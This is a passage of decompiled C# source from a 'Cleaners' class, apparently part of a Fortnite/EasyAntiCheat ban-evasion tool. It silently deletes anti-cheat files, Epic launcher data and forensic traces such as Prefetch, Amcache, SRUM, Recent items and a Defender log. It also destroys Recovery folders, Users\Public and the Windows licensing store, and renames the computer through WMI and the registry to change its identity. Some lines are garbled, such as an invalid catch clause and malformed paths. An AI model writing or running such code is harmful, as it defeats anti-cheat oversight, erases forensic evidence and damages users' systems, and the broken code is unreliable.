					File.Delete("E:\\Program Files\\Epic Games\\Fortnite.lysEB");
				}
			}
			catch
			{
			}
			try
			{
				bool flag85 = Directory.Exists("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir");
				if (flag85)
				{
					Directory.Delete("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag86 = File.Exists("E:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
				if (flag86)
				{
					File.Delete("E:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
				}
			}
			catch
			{
			}
			try
			{
				bool flag87 = File.Exists("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
				if (flag87)
				{
					File.Delete("E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
				}
			}
			catch
			{
			}
			try
			{
				bool flag88 = File.Exists("E:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
				if (flag88)
				{
					File.Delete("E:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
				}
			}
			catch
			{
			}
			try
			{
				bool flag89 = File.Exists("E:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
				if (flag89)
				{
					File.Delete("E:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
				}
			}
			catch
			{
			}
			try
			{
				bool flag90 = Directory.Exists("E:\\MSOCache");
				if (flag90)
				{
					Directory.Delete("E:\\MSOCache", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag91 = File.Exists("E:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
				if (flag91)
				{
					File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
				}
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF245551b.TMP");
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d");
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c");
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a");
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b");
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF24465f8.TMP");
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009023", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009022", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Origin", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Origin", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009024", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009025", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009026", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009027", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009028", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009029", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\Public", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds", true);
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
			}
			catch
			{
			}
			try
			{
				File.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF244a582.TMP");
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Windows\\temp\\w1053", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Windows\\temp\\MpCmdRun.log", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Windows\\Prefetch", true);
			}
			catch
			{
			}
			try
			{
				bool flag92 = File.Exists("F:\\Windows\\System32\\eac_usermode_21537346703536.dll");
				if (flag92)
				{
					File.Delete("F:\\Windows\\System32\\eac_usermode_21537346703536.dll");
				}
			}
			catch
			{
			}
			try
			{
				bool flag93 = Directory.Exists("F:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive");
				if (flag93)
				{
					Directory.Delete("F:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag94 = File.Exists("F:\\Windows\\appcompact\\Programs\\Amcache.hve");
				if (flag94)
				{
					File.Delete("F:\\Windows\\appcompact\\Programs\\Amcache.hve");
				}
			}
			catch
			{
			}
			try
			{
				bool flag95 = File.Exists("F:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
				if (flag95)
				{
					File.Delete("F:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
				}
			}
			catch
			{
			}
			try
			{
				bool flag96 = File.Exists("F:\\Windows\\System\\config\\BBI.LOG2");
				if (flag96)
				{
					File.Delete("F:\\Windows\\System\\config\\BBI.LOG2");
				}
			}
			catch
			{
			}
			bool flag97 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngine");
			if (flag97)
			{
				try
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngine", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag98 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngineLauncher");
			if (flag98)
			{
				try
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\UnrealEngineLauncher", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag99 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher");
			if (flag99)
			{
				try
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag100 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame");
			if (flag100)
			{
				try
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag101 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\NVIDIA Corporation");
				if (flag101)
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\NVIDIA Corporation", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag102 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\Speech Graphics");
				if (flag102)
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Speech Graphics", true);
				}
			}
			catch
			{
			}
			bool flag103 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\Packages");
			if (flag103)
			{
				try
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Packages", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag104 = File.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\AMD\\DxCache");
				if (flag104)
				{
					File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\AMD\\DxCache");
				}
			}
			catch
			{
			}
			try
			{
				bool flag105 = File.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
				if (flag105)
				{
					File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
				}
			}
			catch
			{
			}
			try
			{
				bool flag106 = File.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
				if (flag106)
				{
					File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
				}
			}
			catch
			{
			}
			bool flag107 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent");
			if (flag107)
			{
				try
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			bool flag108 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\Notifications");
			if (flag108)
			{
				try
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.DarkRed;
				}
			}
			try
			{
				bool flag109 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache");
				if (flag109)
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag110 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Roaming\\EasyAntiCheat");
				if (flag110)
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Roaming\\EasyAntiCheat", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag111 = Directory.Exists("F:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore");
				if (flag111)
				{
					Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag112 = File.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
				if (flag112)
				{
					File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
				}
			}
			catch
			{
			}
			try
			{
				bool flag113 = File.Exists("F:\\Program Files\\Epic Games\\Fortnite.lysEB");
				if (flag113)
				{
					File.Delete("F:\\Program Files\\Epic Games\\Fortnite.lysEB");
				}
			}
			catch
			{
			}
			try
			{
				bool flag114 = Directory.Exists("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir");
				if (flag114)
				{
					Directory.Delete("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag115 = File.Exists("F:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
				if (flag115)
				{
					File.Delete("F:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
				}
			}
			catch
			{
			}
			try
			{
				bool flag116 = File.Exists("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
				if (flag116)
				{
					File.Delete("F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
				}
			}
			catch
			{
			}
			try
			{
				bool flag117 = File.Exists("F:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
				if (flag117)
				{
					File.Delete("F:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
				}
			}
			catch
			{
			}
			try
			{
				bool flag118 = File.Exists("F:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
				if (flag118)
				{
					File.Delete("F:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
				}
			}
			catch
			{
			}
			try
			{
				bool flag119 = Directory.Exists("F:\\MSOCache");
				if (flag119)
				{
					Directory.Delete("F:\\MSOCache", true);
				}
			}
			catch
			{
			}
			try
			{
				bool flag120 = File.Exists("F:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
				if (flag120)
				{
					File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
				}
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF245551b.TMP");
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d");
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c");
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a");
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b");
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");
			}
			catch
			{
			}
			try
			{
				File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF24436e9.TMP");
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network Persistent State~RF24465f8.TMP");
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902d", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902c", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902a", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_00902b", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009023", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009022", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Origin", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Origin", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009024", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009025", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009026", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009027", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009028", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\f_009029", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\Public", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds", true);
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Microsoft\\Feeds");
			}
			catch
			{
			}
			try
			{
				File.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF244a582.TMP");
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Windows\\temp\\w1053", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Windows\\temp\\MpCmdRun.log", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Windows\\Prefetch", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Recovery", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Recovery", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Recovery", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Recovery", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Users\\" + userName + "\\AppData\\Local\\EpicGamesLauncher", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("C:\\Windows\\System32\\sru", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("D:\\Windows\\System32\\sru", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("E:\\Windows\\System32\\sru", true);
			}
			catch
			{
			}
			try
			{
				Directory.Delete("F:\\Windows\\System32\\sru", true);
			}
			catch
			{
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00009AE8 File Offset: 0x00007CE8
		public static void CleanFile(string asrg)
		{
			bool flag = asrg != null;
			if (flag)
			{
				bool flag2 = false;
				bool flag3 = File.Exists(asrg);
				if (flag3)
				{
					flag2 = true;
				}
				try
				{
					File.Delete(asrg);
				}
				catch
				{
					try
					{
						File.Delete(asrg);
					}
					catch
					{
						try
						{
							File.Delete(asrg);
						}
						catch
						{
							try
							{
								File.Delete(asrg);
							}
							catch
							{
							}
						}
					}
				}
				bool flag4 = !File.Exists(asrg) && flag2;
				if (flag4)
				{
					bool flag5 = File.Exists("C:\\Users\\" + Environment.UserName + "\\Desktop\\debug.sys");
					if (flag5)
					{
						Console.WriteLine("Deleted " + asrg);
					}
				}
			}
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00009BCC File Offset: 0x00007DCC
		public static void Worker()
		{
			for (;;)
			{
				Thread.Sleep(10);
			}
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00009BEC File Offset: 0x00007DEC
		public static void CleanDir(string asrg)
		{
			bool flag = asrg == null;
			if (!flag)
			{
				try
				{
					try
					{
						foreach (string path in Directory.GetFiles(asrg))
						{
							Cleaners.DeleteFile(path);
						}
					}
					catch
					{
					}
					try
					{
						foreach (string asrg2 in Directory.GetDirectories(asrg))
						{
							Cleaners.CleanDir(asrg2);
						}
					}
					catch
					{
					}
					try
					{
						Directory.Delete(asrg, true);
					}
					catch
					{
					}
					try
					{
						File.Delete(asrg);
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00009CD4 File Offset: 0x00007ED4
		public static void DeleteFile(string path)
		{
			try
			{
				File.Delete(path);
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Deleted: " + path);
				Console.ForegroundColor = ConsoleColor.White;
				Cleaners.Count++;
			}
			catch
			{
			}
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00009D44 File Offset: 0x00007F44
		[CompilerGenerated]
		internal static bool <ModifyRegistry>g__SetComputerName|4_0(string Name)
		{
			string text = "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName";
			try
			{
				string path = "Win32_ComputerSystem.Name='" + Environment.MachineName + "'";
				using (ManagementObject managementObject = new ManagementObject(new ManagementPath(path)))
				{
					using (ManagementBaseObject methodParameters = managementObject.GetMethodParameters("Rename"))
					{
						methodParameters["Name"] = Name;
						ManagementBaseObject managementBaseObject = managementObject.InvokeMethod("Rename", methodParameters, null);
						uint num = (uint)Convert.ChangeType(managementBaseObject.Properties["ReturnValue"].Value, typeof(uint));
						bool flag = num > 0U;
						if (flag)
						{
							throw new Exception("Computer could not be changed due to unknown reason.");
						}
					}
				}
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(text);
				bool flag2 = registryKey == null;
				if (flag2)
				{
					throw new Exception("Registry location '" + text + "' is not readable.");
				}
				bool flag3 = (string)registryKey.GetValue("ComputerName") != Name;
				if (flag3)
				{
					throw new Exception("The computer name was set by WMI but was not updated in the registry location: '" + text + "'");
				}
				registryKey.Close();
				registryKey.Dispose();
			}
			catch (Exceptionxeex)
			{
				return false;
			}
			return true;
		}

		// Token: 0x0400001A RID: 26
		private const string MethodNaame = "Rename";

		// Token: 0x0400001B RID: 27
		private static int Count = 0;
	}
}
